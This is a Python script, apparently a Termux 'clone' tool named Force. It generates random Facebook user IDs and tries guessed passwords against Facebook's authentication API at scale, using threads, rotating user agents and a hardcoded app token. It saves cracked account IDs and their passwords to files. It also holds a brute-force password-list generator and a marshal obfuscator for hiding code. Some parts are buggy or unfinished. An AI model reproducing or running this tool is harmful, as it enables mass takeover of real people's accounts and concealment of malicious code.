#-*-coding:utf-8-*-
#!/user/bin/python3
"""

creater : Faraz Ali ID
Tool      : Force

"""
#[_________IMPORTING__MODULES___________>>
import re,os,sys,smtplib,requests,itertools,json,zipfile
from os import system as cmd
from sys import exit as exit
import os,sys,json
import time,requests
from time import sleep as slp
import os,requests,json,time
import re,random,sys,uuid,string,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import marshal
import os
import sys
import time

header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5"}
ses = requests.Session()
head = {"user-agent": "Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
try:
	ip = get("http://ip-api.com/json/").json()["query"]
except:
	ip = " - "
#__________[ EMPITY LOOP / LIST ]_______>>
oks = []
user_ID = []
cps = []
cracked = []
pwx = []
ualist = []
#[_________COLAR_____________>>
blue = '\033[1;35m'
white = '\033[1;37m'
rad = '\033[1;31m'
green = '\033[1;32m'
#[_________LOGO______________>>
def clearscr():
	cmd("clear") 
def logo():
    os.system("clear")
    print(f""" \033[;91 d88888D db    db db   db  .d8b.  d888888b d8888b. 
YP  d8' 88    88 88   88 d8' `8b   `88'   88  `8D 
   d8'  88    88 88ooo88 88ooo88    88    88oooY' 
  {green}d8'   88    88 88~~~88 88~~~88    88    88~~~b. 
 {rad}d8' db 88b  d88 88   88 88   88   .88.   88   8D {white}
d88888P ~Y8888P' YP   YP YP   YP Y888888P Y8888P' """)
    print(49*'-')
    print(f"[{blue}+{white}] Creater     :      Zuhaib Amjad Abbasi ")
    print(f"[{blue}+{white}] Github      :      {rad}Soon{white} ")
    print(f"[{blue}+{white}] Tool        :      Force")
    print(f"[{blue}+{white}] User IP     :     "+ip)
    print(49*'-')
def tawasulfaraz():
    logo()     
    print(f"{white}[{green}1{white}] Random clone ")
    print(f"[{green}2{white}] Password list generater ")
    print(f"[{green}3{white}] Marshal encryption ")
    print(f"[{green}4{white}] Fbinfoga ")
    print(f"[{green}5{white}] Collect Target IP Adress ")
    print(f"[{green}6{white}] Install Termux Basic Commands ")
    print(f"[{green}7{white}] Contact To Owner ")
    print(49*'-')
    aroosa = input(f"[\033[1;32m>>\033[1;37m] Choose : ")
    print(f"Select Correct option ")
    if aroosa in ["01","1"]:
        random_number()
    elif aroosa in  ["02","2"]:
        createWordList()
    elif aroosa in  ["03","3"]:
    	encryption()
    elif aroosa in  ["04","4"]:pass
    elif aroosa in  ["05","5"]:pass
    elif aroosa in  ["06","6"]:pass
    elif aroosa in  ["07","7"]:pass
    elif aroosa in  ["08","8"]:pass
#[_________RANDOM______________>>
def random_number():
    logo()
    code = input(f"[{green}+{white}] Input Number Code : ")
    try:
        limit = int(input(f"[{green}+{white}] Input Limit Crack : "))
    except ValueError:
        limit = 5000
    for i in range(limit):
        user_ID.append(str(random.randint(1111111, 9999999)))
    try:
        limit = int(input(f"[{green}+{white}] Input Password Limit : "))
        if limit > 9:
            limit = 3
    except ValueError:
        limit = 3
    logo()
    print(f"[{green}+{white}] example : first6digit - fullnumber")
    print(f"[{green}+{white}] example : last6digit - last7digit")
    print(f"[{green}+{white}] example : khankhan - 786786 - 000786")
    print(49*'-')
    for i in range(limit):
        password = input(f"[{green}+{white}] Input Password {str(i+1)} : ")
        if len(password) >= 6:
            pwx.append(password)
    with ThreadPool(max_workers=30) as FarazAliID:
        total = str(len(user_ID))
        logo()
        print(f"[{green}*{white}] Total UID for Crack : {total}")
        print(f"[{green}*{white}] Total Password for Crack : {str(len(pwx))}")
        print(f"[{green}*{white}] Code for UID Dump : {str(code)}")
        print(49*'-')
        for user in user_ID:
            uid = code+user
            FarazAliID.submit(bapi,uid,pwx,total)
    print(49*"-")
    print(f"\n{white}[{green}+{white}] process Has been Completed")
    print(f"{white}[{green}+{white}] Total Ids : {len(oks)} ")
#___________[ B-API CRACK ]________>>
def bapi(uid,pwx,total):
    global oks,cps
    global ualist
    global cracked
    try:
        last7digit = uid[int(len(uid))-7:]
        last6digit = uid[int(len(uid))-6:]
        first6digit = uid[0:6]
        fullnumber = uid
        sys.stdout.write(f'\r\r[{green}FARAZ{white}] {len(cracked)}\{total} - {green}{len(oks)}{white}\{rad}{len(cps)}{white} ');sys.stdout.flush()
        for pw in pwx:
            pw = pw.replace("last7digit",last7digit)
            pw = pw.replace("last6digit",last6digit)
            pw = pw.replace("first6digit",first6digit)
            pw = pw.replace("fullnumber",fullnumber)
            useragent = random.choice(ualist)
            dataX = {'email':uid,
                    'password':pw,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
            headersX = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': useragent}
            responce = requests.post('https://b-api.facebook.com/method/auth.login',data=dataX,headers=headersX,allow_redirects=False).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                uidX = str(responce_json['uid'])
                if uidX not in oks:
                    print(f'\r{green}[FARAZ-OK] {uidX} | {pw} {white}')
                    open('/sdcard/FARAZ-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'\r{rad}[FARAZ-CP] {uid}     | {pw} {white}')
                    open('/sdcard/FARAZ-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:pass    
##_____________[ PASSWORD LIST GENERATER V1]___________>>
def createWordList():
	logo()
	chrs = input(f"[{green}+{white}] Enter Characters for Passlist : ")
	try:
		min_length = int(input(f"[{green}+{white}] Input Minimum Password length : "))
	except ValueError:
		min_length = 4
	try:
		max_length = int(input(f"[{green}+{white}] Input Maximum Password length : "))
	except ValueError:
		max_length = 6
	outputX = input(f"[{green}+{white}] PassList Save as : ")
	output = open(outputX, 'w')
	print("--------------------------------------------------")
	print(f"          {green}Process Is Started Please Wait{white}")
	print("--------------------------------------------------")
	slp(2)
	for n in range(min_length, max_length + 1):
		for xs in itertools.product(chrs, repeat=n):
			chars = ''.join(xs)
			output.write("%s\n" % chars)
			print(chars)
	lines_Pass = len((open(outputX,"r").read()).splitlines())
	output.close()
	#print("--------------------------------------------------")
	print(f"[{green}+{white}] PassList Save As : {outputX}")
	print(f"[{green}+{white}] Total Passwords : {str(lines_Pass)}")
	print(f"[{green}+{white}] Length - Minimum / Maximum : {str(min_length)} / {str(max_length)}")
	print("--------------------------------------------------")
	input(f"[{rad}+{white}] Enter for main menu ")
	slp(1)
	tawasulfaraz()
#____ENCRYPYTION_______>>
def encryption():
	os.system("clear");logo()
	print(f"[{green}+{white}] Encrypt Your File Into Py3 Marshal ")
	print(f"[{green}+{white}] Enter File path As\033[1;92m /sdcard/filename.py\033[0;m")
	print("-"*49)
	x = input(f"[{green}+{white}] Enter Source File : ")
	try:
		q = x.split('.')
		u = q[0] + "_enc.py"
	except:
		u = input(f"[{green}+{white}] Encoded File Save As : ")
	f = int(input(f"\n[{green}+{white}] Enter Encoding layer Limit : "))
	print("")
	a = open(x).read()
	try:
		j = 0
		for i in range(f):
			j += 1
			m = compile(a, ' ', 'exec')
			k = marshal.dumps(m)
			t = '#Encoded By : FarazAliID\n#github : FARAZ-ID\n#Encryption : Py3 Marshal\nimport marshal\nexec(marshal.loads('+repr(k)+'))'
			time.sleep(0.004)
			print("\x1b[1;97m[✓] Encoding layer >> " + str(j))
	except ValueError:
		exit("\n[>>] Wrong Input Value")
	except FileNotFoundError:
		exit(f"\n[>>] File " + x + "Not Found")
	print("")
	l = open(u, 'w')
	l.write(t)
	l.close()
	print("-"*50)
	print("[>>] Your Encoded File Save As >> \x1b[1;92m" + u )
	input("\033[0;m[>>]Press Inter to go Back ");time.sleep(2);main()

if __name__=="__main__":
    tawasulfaraz()